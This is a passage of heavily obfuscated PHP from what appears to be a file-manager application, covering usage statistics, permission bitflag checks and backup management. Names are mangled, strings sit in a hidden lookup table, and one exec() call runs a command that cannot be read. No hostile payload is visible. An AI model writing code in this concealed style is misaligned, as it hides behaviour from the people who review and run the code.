$≥®◊¬Á∞ = (int) date($¢†œ∆’[1765], strtotime($ÿ‘Ç≥—ˆ)); $⁄∑ï‚ë© = (int) date($¢†œ∆’[1765]); if ($≥®◊¬Á∞ >= $⁄∑ï‚ë©) { break; } for ($≥®◊¬Á∞; $≥®◊¬Á∞ < $⁄∑ï‚ë©; $≥®◊¬Á∞++) { $∫∏µ∂áÿ[] = $≥®◊¬Á∞ . $¢†œ∆’[1768]; } break; default: break; } if ($ÿ‘Ç≥—ˆ > end($∫∏µ∂áÿ)) { array_pop($∫∏µ∂áÿ); } sort($∫∏µ∂áÿ); return $∫∏µ∂áÿ; } public function listTable($≠â˘ÕÅõ) { $≠÷∏»ÍØ = ucfirst($≠â˘ÕÅõ); return Model($≠÷∏»ÍØ)->listData(); } public function option($›°íÊÿ«) { $á≠Ç˙ã√ = $_SERVER[Çâä∆◊¡][1769] . ucfirst($›°íÊÿ«); return $this->{$á≠Ç˙ã√}(); } private function optionUser() { $ΩÖ˛⁄í≠ =& $_SERVER[Çâä∆◊¡]; $≥£Î÷Ê« = Model($ΩÖ˛⁄í≠[538])->count($ΩÖ˛⁄í≠[1642]); $ÈÉ≈ï⁄Æ = Model($ΩÖ˛⁄í≠[538])->where($ΩÖ˛⁄í≠[1770])->count($ΩÖ˛⁄í≠[1642]); $ˆú§Î‚… = intval($GLOBALS[$ΩÖ˛⁄í≠[6]][$ΩÖ˛⁄í≠[344]][$ΩÖ˛⁄í≠[1598]]) / 3600; $–ìñ·•  = strtotime("\x2d{$ˆú§Î‚…}\40\x68\157\x75\162\163"); $òö«Î≥ﬁ = strtotime(date($ΩÖ˛⁄í≠[1751])); if ($–ìñ·•  < $òö«Î≥ﬁ) { $–ìñ·•  = $òö«Î≥ﬁ; } $ÚíØ¬ßÿ = array($ΩÖ˛⁄í≠[1771] => array($ΩÖ˛⁄í≠[1001], $–ìñ·• )); $“‘á≥Õ∂ = (int) Model($ΩÖ˛⁄í≠[538])->where($ÚíØ¬ßÿ)->count($ΩÖ˛⁄í≠[1642]); if (!$“‘á≥Õ∂) { $“‘á≥Õ∂ = 1; } $ÚíØ¬ßÿ = array($ΩÖ˛⁄í≠[1771] => array($ΩÖ˛⁄í≠[1001], $òö«Î≥ﬁ)); $⁄‹°ãÕ¢ = Model($ΩÖ˛⁄í≠[538])->where($ÚíØ¬ßÿ)->count($ΩÖ˛⁄í≠[1642]); return array($ΩÖ˛⁄í≠[752] => (int) $≥£Î÷Ê«, $ΩÖ˛⁄í≠[1772] => (int) ($≥£Î÷Ê« - $ÈÉ≈ï⁄Æ), $ΩÖ˛⁄í≠[1773] => (int) $ÈÉ≈ï⁄Æ, $ΩÖ˛⁄í≠[1774] => (int) $⁄‹°ãÕ¢, $ΩÖ˛⁄í≠[1775] => $“‘á≥Õ∂); } private function optionFile() { $ŒÙ˙í∆‡ =& $_SERVER[Çâä∆◊¡]; $≈π†ïÆﬁ = $this->sourceSize(); $ÉÙ¸’ÿÓ = $≈π†ïÆﬁ[$ŒÙ˙í∆‡[80]]; $ç∂ªÍ∂á = $≈π†ïÆﬁ[$ŒÙ˙í∆‡[1744]]; $ÜªﬁâÎÃ = Model($ŒÙ˙í∆‡[818])->where(array($ŒÙ˙í∆‡[411] => 0))->count($ŒÙ˙í∆‡[403]); $ÖÇ˝˛åû = array($ŒÙ˙í∆‡[411] => 0, $ŒÙ˙í∆‡[193] => array($ŒÙ˙í∆‡[1001], strtotime(date($ŒÙ˙í∆‡[1751])))); $‹√Óëè¬ = Model($ŒÙ˙í∆‡[818])->where($ÖÇ˝˛åû)->sum($ŒÙ˙í∆‡[80]); $™ÙÜÈñÉ = Model($ŒÙ˙í∆‡[818])->where($ÖÇ˝˛åû)->count($ŒÙ˙í∆‡[403]); return array($ŒÙ˙í∆‡[756] => $ÉÙ¸’ÿÓ, $ŒÙ˙í∆‡[1744] => $ç∂ªÍ∂á, $ŒÙ˙í∆‡[1776] => $ÉÙ¸’ÿÓ - $ç∂ªÍ∂á, $ŒÙ˙í∆‡[1777] => (int) $‹√Óëè¬, $ŒÙ˙í∆‡[758] => (int) $ÜªﬁâÎÃ, $ŒÙ˙í∆‡[1778] => (int) $™ÙÜÈñÉ); } private function optionAccess() { $Ùú◊∫öí =& $_SERVER[Çâä∆◊¡]; return array($Ùú◊∫öí[752] => $this->typeLogCnt(), $Ùú◊∫öí[108] => $this->typeLogCnt($Ùú◊∫öí[108]), $Ùú◊∫öí[450] => $this->typeLogCnt($Ùú◊∫öí[450]), $Ùú◊∫öí[1779] => $this->typeLogCnt($Ùú◊∫öí[1779]), $Ùú◊∫öí[1780] => $this->typeLogCnt($Ùú◊∫öí[1780]), $Ùú◊∫öí[594] => $this->typeLogCnt($Ùú◊∫öí[12], $Ùú◊∫öí[1755])); } private function typeLogCnt($≥üœÜ…Í = '', $Í¨—Ü¨ò = "\151\x64") { $îµÚÉ≤ç =& $_SERVER[Çâä∆◊¡]; $Õó‹∞ñü = array($îµÚÉ≤ç[108] => array($îµÚÉ≤ç[1781], $îµÚÉ≤ç[1782]), $îµÚÉ≤ç[450] => array($îµÚÉ≤ç[1783], $îµÚÉ≤ç[1784]), $îµÚÉ≤ç[1779] => array($îµÚÉ≤ç[1785], $îµÚÉ≤ç[1786], $îµÚÉ≤ç[1787]), $îµÚÉ≤ç[1780] => array($îµÚÉ≤ç[1788], $îµÚÉ≤ç[1789]), $îµÚÉ≤ç[1790] => array($îµÚÉ≤ç[1791], $îµÚÉ≤ç[1792], $îµÚÉ≤ç[1793])); $Å¢ô‰˘ë = strtotime(date($îµÚÉ≤ç[1751])); $¢ãÂ…÷ñ = array($îµÚÉ≤ç[193] => array($îµÚÉ≤ç[1001], $Å¢ô‰˘ë)); if ($≥üœÜ…Í) { $¢ãÂ…÷ñ[$îµÚÉ≤ç[33]] = array($îµÚÉ≤ç[7], $Õó‹∞ñü[$≥üœÜ…Í]); } $È˘Åààè = Model($îµÚÉ≤ç[1754])->where($¢ãÂ…÷ñ)->count($Í¨—Ü¨ò); return (int) $È˘Åààè; } private function optionServer() { $ú⁄ıﬁ–û =& $_SERVER[Çâä∆◊¡]; $·Õ›‚ñ◊ = $this->diskDriver(); $ı ß ±Î = KodIO::defaultDriver(); $ñı‹¸€ã = array($ú⁄ıﬁ–û[810] => $ı ß ±Î[$ú⁄ıﬁ–û[401]]); $í´¶à§® = Model($ú⁄ıﬁ–û[470])->where($ñı‹¸€ã)->sum($ú⁄ıﬁ–û[80]); $¸“µ’¯ë = explode($ú⁄ıﬁ–û[53], $_SERVER[$ú⁄ıﬁ–û[140]]); $¥˙„ÚÑﬁ = $¸“µ’¯ë[0]; $⁄õî•…„ = $GLOBALS[$ú⁄ıﬁ–û[6]][$ú⁄ıﬁ–û[21]]; $ÁÏıÌå∞ = $⁄õî•…„[$ú⁄ıﬁ–û[963]]; if ($ÁÏıÌå∞ == $ú⁄ıﬁ–û[951]) { $•ó˛≥Õÿ = explode($ú⁄ıﬁ–û[1257], $⁄õî•…„[$ú⁄ıﬁ–û[962]]); $ÁÏıÌå∞ = $•ó˛≥Õÿ[0]; } if ($ÁÏıÌå∞ == $ú⁄ıﬁ–û[899] || $ÁÏıÌå∞ == $ú⁄ıﬁ–û[797]) { $¨≥Ö¡∂ˆ = Model()->db()->query($ú⁄ıﬁ–û[1794]); $≠∫æﬂ…Ä = $¨≥Ö¡∂ˆ[0] && isset($¨≥Ö¡∂ˆ[0][$ú⁄ıﬁ–û[1538]]) ? $¨≥Ö¡∂ˆ[0][$ú⁄ıﬁ–û[1538]] : 0; $ÁÏıÌå∞ = $ú⁄ıﬁ–û[1795] . ($≠∫æﬂ…Ä ? $ú⁄ıﬁ–û[8] . $≠∫æﬂ…Ä : $ú⁄ıﬁ–û[12]); } $ïŸóÜ¯Ï = $GLOBALS[$ú⁄ıﬁ–û[6]][$ú⁄ıﬁ–û[344]][$ú⁄ıﬁ–û[820]]; return array($ú⁄ıﬁ–û[1796] => $·Õ›‚ñ◊ ? $·Õ›‚ñ◊[$ú⁄ıﬁ–û[1797]] : 0, $ú⁄ıﬁ–û[1798] => $·Õ›‚ñ◊ ? $·Õ›‚ñ◊[$ú⁄ıﬁ–û[1799]] : 0, $ú⁄ıﬁ–û[1800] => (int) $ı ß ±Î[$ú⁄ıﬁ–û[1797]] * 1024 * 1024 * 1024, $ú⁄ıﬁ–û[1801] => (int) $í´¶à§®, $ú⁄ıﬁ–û[1802] => ucfirst($¥˙„ÚÑﬁ), $ú⁄ıﬁ–û[1803] => $ú⁄ıﬁ–û[1804] . PHP_VERSION, $ú⁄ıﬁ–û[1805] => phpBuild64() ? 64 : 32, $ú⁄ıﬁ–û[751] => str_replace($ú⁄ıﬁ–û[1117], $ú⁄ıﬁ–û[979], $ÁÏıÌå∞), $ú⁄ıﬁ–û[344] => ucfirst($ïŸóÜ¯Ï), $ú⁄ıﬁ–û[32] => $_SERVER[$ú⁄ıﬁ–û[1806]]); } private function diskDriver() { $¿Òô…ÚÖ =& $_SERVER[Çâä∆◊¡]; $ø∑≈˛è¨ = $¿Òô…ÚÖ[8]; $¶·ó”àò = $GLOBALS[$¿Òô…ÚÖ[6]][$¿Òô…ÚÖ[1273]] == $¿Òô…ÚÖ[1274]; if ($¶·ó”àò) { $ø∑≈˛è¨ = $¿Òô…ÚÖ[1807]; if (function_exists($¿Òô…ÚÖ[1808])) { exec($¿Òô…ÚÖ[1809], $ôé‹Õ¬…); $ø∑≈˛è¨ = $ôé‹Õ¬…[1] . $¿Òô…ÚÖ[8]; } } if (!file_exists($ø∑≈˛è¨)) { return; } $˝ü©”Ü = @disk_total_space($ø∑≈˛è¨); $‹ÄãﬂΩ„ = $˝ü©”Ü - @disk_free_space($ø∑≈˛è¨); return array($¿Òô…ÚÖ[1797] => $˝ü©”Ü, $¿Òô…ÚÖ[1799] => $‹ÄãﬂΩ„); } public function fileChart($πË‰˛ÍÏ) { $±∑§÷ß´ =& $_SERVER[Çâä∆◊¡]; if (isset($πË‰˛ÍÏ[$±∑§÷ß´[1642]])) { return Model($±∑§÷ß´[818])->userFileTypeProfile($πË‰˛ÍÏ[$±∑§÷ß´[1642]]); } if (isset($πË‰˛ÍÏ[$±∑§÷ß´[1810]])) { return Model($±∑§÷ß´[818])->groupFileTypeProfile($πË‰˛ÍÏ[$±∑§÷ß´[1810]]); } $¯í‚‘Ò‚ = $this->sourceSize(); $≈‚≤·≤ë = array($±∑§÷ß´[498] => 0, $±∑§÷ß´[412] => 1); $‡÷Ïñ∂› = Model($±∑§÷ß´[818])->where($≈‚≤·≤ë)->sum($±∑§÷ß´[80]); $≈‚≤·≤ë[$±∑§÷ß´[412]] = 2; $¥—òù≈Å = Model($±∑§÷ß´[818])->where($≈‚≤·≤ë)->sum($±∑§÷ß´[80]); return array($±∑§÷ß´[756] => $¯í‚‘Ò‚[$±∑§÷ß´[80]], $±∑§÷ß´[1744] => $¯í‚‘Ò‚[$±∑§÷ß´[1744]], $±∑§÷ß´[1745] => (int) $‡÷Ïñ∂›, $±∑§÷ß´[1746] => (int) $¥—òù≈Å); } private function sourceSize() { $‚‹’Ì˙ =& $_SERVER[Çâä∆◊¡]; $¥ìß¿Ç≥ = Model($‚‹’Ì˙[818])->where(array($‚‹’Ì˙[411] => 0))->sum($‚‹’Ì˙[80]); $ÌüëÄëã = Model($‚‹’Ì˙[470])->sum($‚‹’Ì˙[80]); if ($ÌüëÄëã > $¥ìß¿Ç≥) { $ÌüëÄëã = $¥ìß¿Ç≥; } return array($‚‹’Ì˙[80] => (int) $¥ìß¿Ç≥, $‚‹’Ì˙[1744] => (int) $ÌüëÄëã); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¨•˜„ËÚ =& $_SERVER[Çâä∆◊¡]; $Æ«¡°˘ö = array(array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1811]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1813], $¨•˜„ËÚ[1814] => 1, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1817]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1818], $¨•˜„ËÚ[1814] => 2, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1819]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1820], $¨•˜„ËÚ[1814] => 3, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1821]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1822], $¨•˜„ËÚ[1814] => 4, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_VIEW), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1823]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1824], $¨•˜„ËÚ[1814] => 5, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1825]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1826], $¨•˜„ËÚ[1814] => 6, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¨•˜„ËÚ[421] => LNG($¨•˜„ËÚ[1827]), $¨•˜„ËÚ[1812] => $¨•˜„ËÚ[1828], $¨•˜„ËÚ[1814] => 7, $¨•˜„ËÚ[1815] => 1, $¨•˜„ËÚ[1816] => 0)); return $Æ«¡°˘ö; } public static function authCheck($äΩñ£µù, $˙È˚¨º≤) { $äΩñ£µù = intval($äΩñ£µù); if ($GLOBALS[$_SERVER[Çâä∆◊¡][505]]) { return !0; } if ($äΩñ£µù <= 0) { return !1; } if (($äΩñ£µù & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($äΩñ£µù & $˙È˚¨º≤); } public static function authCheckShow($Î¥Ãæ∫ò) { return self::authCheck($Î¥Ãæ∫ò, self::AUTH_SHOW); } public static function authCheckView($À˜ü∏»∑) { return self::authCheck($À˜ü∏»∑, self::AUTH_VIEW); } public static function authCheckDownload($ÃòÁ≈Ó“) { return self::authCheck($ÃòÁ≈Ó“, self::AUTH_DOWNLOAD); } public static function authCheckUpload($πŸ®ÊÙØ) { return self::authCheck($πŸ®ÊÙØ, self::AUTH_UPLOAD); } public static function authCheckEdit($πØ…–ÍÕ) { return self::authCheck($πØ…–ÍÕ, self::AUTH_EDIT); } public static function authCheckRemove($Ùù¢ô˛√) { return self::authCheck($Ùù¢ô˛√, self::AUTH_REMOVE); } public static function authCheckShare($Á±Àõ¶Ÿ) { return self::authCheck($Á±Àõ¶Ÿ, self::AUTH_SHARE); } public static function authCheckComment($≥ø›å◊¿) { return self::authCheck($≥ø›å◊¿, self::AUTH_COMMENT); } public static function authCheckEvent($ø§¿‚πÙ) { return self::authCheck($ø§¿‚πÙ, self::AUTH_EVENT); } public static function authCheckRoot($°†Ù™‰π) { return self::authCheck($°†Ù™‰π, self::AUTH_ROOT); } public static function authCheckAction($°ŒáË∞∂, $ﬂ˚®¸ïÎ) { $€ìîÙ©õ =& $_SERVER[Çâä∆◊¡]; $ËÉäÏì© = array($€ìîÙ©õ[1829] => self::AUTH_VIEW, $€ìîÙ©õ[1184] => self::AUTH_DOWNLOAD, $€ìîÙ©õ[108] => self::AUTH_UPLOAD, $€ìîÙ©õ[1780] => self::AUTH_EDIT, $€ìîÙ©õ[1779] => self::AUTH_REMOVE, $€ìîÙ©õ[1790] => self::AUTH_SHARE, $€ìîÙ©õ[349] => self::AUTH_COMMENT, $€ìîÙ©õ[1630] => self::AUTH_EVENT, $€ìîÙ©õ[1830] => self::AUTH_ROOT); if (!isset($ËÉäÏì©[$ﬂ˚®¸ïÎ])) { return; } $ƒ§µ©˝‹ = $ËÉäÏì©[$ﬂ˚®¸ïÎ]; $°ŒáË∞∂ = intval($°ŒáË∞∂); if ($°ŒáË∞∂ <= 0) { return !1; } if (($°ŒáË∞∂ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($°ŒáË∞∂ & $ƒ§µ©˝‹); } public static function authDisable($‡ÏíµÄé, $ﬁâ≤æÅò) { if (intval($‡ÏíµÄé) <= 0) { return 0; } return intval($‡ÏíµÄé) & ~$ﬁâ≤æÅò; } public $optionType = "\x53\x79\163\164\145\155\x2e\163\x6f\x75\162\x63\x65\x41\x75\x74\150\x4c\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\141\165\x74\x68", "\154\x61\x62\x65\154", "\x64\151\163\x70\x6c\141\x79", "\163\x79\x73\x74\145\155", "\x73\x6f\162\164"); public function initData() { $â—ùΩ…Ò = $this->authDefault(); foreach ($â—ùΩ…Ò as $ﬂˆß≤¬Œ) { $this->add($ﬂˆß≤¬Œ); } } public function findAuth($˜®¥ù„‚, $Ç„‰¯·Ê) { $¨∞Ø˘≈˝ =& $_SERVER[Çâä∆◊¡]; $ë∑›⁄íÑ = parent::listData(); foreach ($ë∑›⁄íÑ as $íïøè–ƒ) { $†ëµ®Œ„ = intval($íïøè–ƒ[$¨∞Ø˘≈˝[414]]); if ($†ëµ®Œ„ <= 0 || $íïøè–ƒ[$¨∞Ø˘≈˝[1831]] == 0) { continue; } if (($†ëµ®Œ„ & $˜®¥ù„‚) != $˜®¥ù„‚) { continue; } if (($†ëµ®Œ„ & $Ç„‰¯·Ê) != 0) { continue; } return $íïøè–ƒ[$¨∞Ø˘≈˝[401]]; } return !1; } public function findAuthReadOnly() { $è˛ÿ¯£Â = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $èÌÄÍ»’ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($è˛ÿ¯£Â, $èÌÄÍ»’); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($êﬂÅ“äë = false, $˘É◊ﬂ⁄û = "\163\x6f\x72\164", $©ÙüÛ¢‹ = false) { return parent::listData($êﬂÅ“äë, $˘É◊ﬂ⁄û, $©ÙüÛ¢‹); } public function update($®ÕíÜùı, $ıπ˝Á≠ﬁ) { $öçº©Ø’ =& $_SERVER[Çâä∆◊¡]; $ë§á˙™Ì = parent::listData($®ÕíÜùı); $–≥ÄÏºŒ = $this->findByName($ıπ˝Á≠ﬁ[$öçº©Ø’[32]]); if (!$ë§á˙™Ì || $–≥ÄÏºŒ && $–≥ÄÏºŒ[$öçº©Ø’[401]] != $ë§á˙™Ì[$öçº©Ø’[401]]) { return !1; } $this->filterAuth($ıπ˝Á≠ﬁ[$öçº©Ø’[414]]); return parent::update($®ÕíÜùı, $ıπ˝Á≠ﬁ); } public function remove($•ÏÁÿ‚ê) { $Ìë¥≈‘© = parent::listData($•ÏÁÿ‚ê); if (!$Ìë¥≈‘© || $Ìë¥≈‘©[$_SERVER[Çâä∆◊¡][1261]]) { return !1; } return parent::remove($•ÏÁÿ‚ê); } public function add($≤√ˆ–àﬁ = array()) { $ÎåŸß“• =& $_SERVER[Çâä∆◊¡]; if ($this->findByName($≤√ˆ–àﬁ[$ÎåŸß“•[32]])) { return !1; } $Â¬¡ƒíÍ = array($ÎåŸß“•[32] => $ÎåŸß“•[12], $ÎåŸß“•[414] => 1, $ÎåŸß“•[1832] => $ÎåŸß“•[1820], $ÎåŸß“•[1831] => 1, $ÎåŸß“•[1261] => 0, $ÎåŸß“•[1833] => 0); $≤√ˆ–àﬁ = array_merge($Â¬¡ƒíÍ, $≤√ˆ–àﬁ); $≤√ˆ–àﬁ[$ÎåŸß“•[1833]] = $this->getSort(); $this->filterAuth($≤√ˆ–àﬁ[$ÎåŸß“•[414]]); return parent::insert($≤√ˆ–àﬁ); } private function getSort() { $¨ñóˆà• =& $_SERVER[Çâä∆◊¡]; $…“Úñ⁄˛ = parent::listData(); $˘¢˝Ê∏ô = array_to_keyvalue($…“Úñ⁄˛, $¨ñóˆà•[12], $¨ñóˆà•[1833]); return empty($˘¢˝Ê∏ô) ? 0 : max($˘¢˝Ê∏ô) + 1; } private function filterAuth(&$‹ƒ…¡ıØ) { if (!$‹ƒ…¡ıØ) { return; } $“ûÂ∂ú∏ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ˆ‰»â√Ü = array(); foreach ($“ûÂ∂ú∏ as $ØâúÉß§) { if ($‹ƒ…¡ıØ & $ØâúÉß§) { $ˆ‰»â√Ü[] = $ØâúÉß§; } } if (in_array(self::AUTH_ROOT, $ˆ‰»â√Ü)) { $‹ƒ…¡ıØ = array_sum($“ûÂ∂ú∏); return; } $é√·ÃÛ‹ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ˆ‰»â√Ü as $ØâúÉß§) { if (isset($é√·ÃÛ‹[$ØâúÉß§])) { $ˆ‰»â√Ü = array_merge($ˆ‰»â√Ü, $é√·ÃÛ‹[$ØâúÉß§]); } } $ˆ‰»â√Ü[] = self::AUTH_SHOW; $‹ƒ…¡ıØ = array_sum(array_unique($ˆ‰»â√Ü)); } public function sort($—Î±Éﬂ‘, $—…ìáÒö) { return parent::update($—Î±Éﬂ‘, $—…ìáÒö); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x62\x61\143\x6b\x75\160\x4c\151\x73\x74"; public $field = array("\151\157", "\156\141\x6d\145", "\163\x74\x61\x74\x75\163", "\143\157\156\164\145\x6e\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\x65\x73\x75\154\x74", "\164\151\155\x65\x46\162\157\x6d", "\164\151\155\x65\124\x6f"); public function config() { $Á®ØÅ†À =& $_SERVER[Çâä∆◊¡]; $›¸Ò¡Â– = Model($Á®ØÅ†À[763])->get($Á®ØÅ†À[773]); $›¸Ò¡Â– = json_decode($›¸Ò¡Â–, !0); $›¸Ò¡Â– = is_array($›¸Ò¡Â–) ? $›¸Ò¡Â– : array(); if (!isset($›¸Ò¡Â–[$Á®ØÅ†À[748]])) { $›¸Ò¡Â–[$Á®ØÅ†À[748]] = $Á®ØÅ†À[89]; } unset($›¸Ò¡Â–[$Á®ØÅ†À[1612]]); Action($Á®ØÅ†À[1834])->taskInit(); Model($Á®ØÅ†À[1611])->cacheClear(); $øÒÏíã≥ = $Á®ØÅ†À[1835]; $˘˛ııùŸ = Model($Á®ØÅ†À[1836])->findByKey($Á®ØÅ†À[1630], $øÒÏíã≥); if (!$˘˛ııùŸ) { $˘˛ııùŸ = array(); } if (isset($˘˛ııùŸ[$Á®ØÅ†À[196]])) { $˘˛ııùŸ[$Á®ØÅ†À[196]] = json_decode($˘˛ııùŸ[$Á®ØÅ†À[196]], !0); } if (isset($›¸Ò¡Â–[$Á®ØÅ†À[196]])) { $˘˛ııùŸ[$Á®ØÅ†À[196]][$Á®ØÅ†À[1615]] = $›¸Ò¡Â–[$Á®ØÅ†À[196]]; unset($›¸Ò¡Â–[$Á®ØÅ†À[196]]); } return array_merge($˘˛ııùŸ, $›¸Ò¡Â–); } public function listData($§ØÈ⁄≠ı = false, $î≈¸ªØä = "\x6d\x6f\x64\x69\x66\171\124\x69\155\145", $√–Ó´–Â = false) { return parent::listData($§ØÈ⁄≠ı, $î≈¸ªØä, !0); } public function lastItem() { $ß¨‚‹ä¥ = $this->listData(); return !empty($ß¨‚‹ä¥[0]) ? $ß¨‚‹ä¥[0] : null; } public function kill($”Õ¸›œç) { $∏ä◊™©á =& $_SERVER[Çâä∆◊¡]; $Åø”Åë∞ = $this->listData($”Õ¸›œç); if (!$Åø”Åë∞ || empty($Åø”Åë∞[$∏ä◊™©á[32]])) { return !0; } Task::kill($∏ä◊™©á[772]); Task::kill($∏ä◊™©á[793]); Task::kill($∏ä◊™©á[802]); $ò˘ÊÊñﬂ = $Åø”Åë∞[$∏ä◊™©á[32]]; $Ø†ö¡˚˘ = TEMP_FILES . $∏ä◊™©á[771] . $ò˘ÊÊñﬂ . $∏ä◊™©á[8]; IO::remove($Ø†ö¡˚˘, !1); return $this->remove($”Õ¸›œç); } public function remove($‘–ﬁÁéÙ) { $’’åÒÍˆ = $this->listData($‘–ﬁÁéÙ); if (!$’’åÒÍˆ) { return !0; } return $this->backupRemove($’’åÒÍˆ); } private function backupRemove($õ€®Äæ¯) { parent::remove($õ€®Äæ¯[$_SERVER[Çâä∆◊¡][401]]); $¥≈ÓÙâà = $this->backupPath($õ€®Äæ¯); IO::remove($¥≈ÓÙâà, !1); return !0; } private function backupPath($¢¿˝∆›‹) { $¸≥›ﬂ◊§ =& $_SERVER[Çâä∆◊¡]; $Å˘°¿¡≤ = $¢¿˝∆›‹[$¸≥›ﬂ◊§[32]]; $·ÑØªÒÂ = Model($¸≥›ﬂ◊§[763])->get($¸≥›ﬂ◊§[764]); $Ñ˘§î˚» = substr(md5($¸≥›ﬂ◊§[765] . $·ÑØªÒÂ . $Å˘°¿¡≤), 0, 8); return "\173\151\157\x3a{$¢¿˝∆›‹[$¸≥›ﬂ◊§[745]]}\x7d\57\144\x61\x74\141\x62\x61\163\x65\x2f\x62\141\x63\x6b\x75\160\57" . $Å˘°¿¡≤ . $¸≥›ﬂ◊§[11] . $Ñ˘§î˚»; } public function start() { $èÍ„ÊÎì =& $_SERVER[Çâä∆◊¡]; if ($GLOBALS[$èÍ„ÊÎì[6]][$èÍ„ÊÎì[90]][$èÍ„ÊÎì[1837]] != $èÍ„ÊÎì[89]) { return !0; } $–Ç∂´ô∆ = $this->config(); if (!$–Ç∂´ô∆ || $–Ç∂´ô∆[$èÍ„ÊÎì[1612]] != $èÍ„ÊÎì[89]) { return !1; } $ÄÑ◊ÔôÉ = $this->process(); foreach ($ÄÑ◊ÔôÉ as $§Ä´Äí¬) { if ($§Ä´Äí¬) { return Task::restart($§Ä´Äí¬[$èÍ„ÊÎì[401]]); } } $ÔéÒ£Ωı = new Backup(); $¥™¯∏√∂ = $ÔéÒ£Ωı->db(); if ($¥™¯∏√∂) { $¥™¯∏√∂ = $ÔéÒ£Ωı->dbFile(); if ($¥™¯∏√∂ && $–Ç∂´ô∆[$èÍ„ÊÎì[748]] == $èÍ„ÊÎì[190]) { $¥™¯∏√∂ = $ÔéÒ£Ωı->file(); } } Backup::set(array($èÍ„ÊÎì[743] => 1, $èÍ„ÊÎì[496] => time())); return !0; } public function process() { $ƒΩáÇõ∂ =& $_SERVER[Çâä∆◊¡]; $÷Ùê˘Ã° = array($ƒΩáÇõ∂[751] => Task::get($ƒΩáÇõ∂[772]), $ƒΩáÇõ∂[755] => Task::get($ƒΩáÇõ∂[793]), $ƒΩáÇõ∂[192] => Task::get($ƒΩáÇõ∂[802])); $ì««¬”ö = !1; foreach ($÷Ùê˘Ã° as &$®ﬁô€–”) { if ($ì««¬”ö) { $®ﬁô€–” = !1; continue; } if ($®ﬁô€–”) { $ùêÕèƒ¢ = intval(_get($®ﬁô€–”, $ƒΩáÇõ∂[1647], 0)); if (time() - $ùêÕèƒ¢ > 7200) { Task::kill($®ﬁô€–”[$ƒΩáÇõ∂[401]]); $ì««¬”ö = !0; $®ﬁô€–” = !1; } } } return $÷Ùê˘Ã°; } public function restore() { $®®—ÌıÌ =& $_SERVER[Çâä∆◊¡]; ActionCall($®®—ÌıÌ[1047], !0, 1); ActionCall($®®—ÌıÌ[1047], !0, 0); } } goto Dâéìò¥¶ê; f„≈§õÚ√ç: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($µ‰∏ìœù) { $∫ı‰Ñ…‘ =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($∫ı‰Ñ…‘[549], $µ‰∏ìœù); $çá˜‘ø¬ = 1; $this->_lockEvent($µ‰∏ìœù, 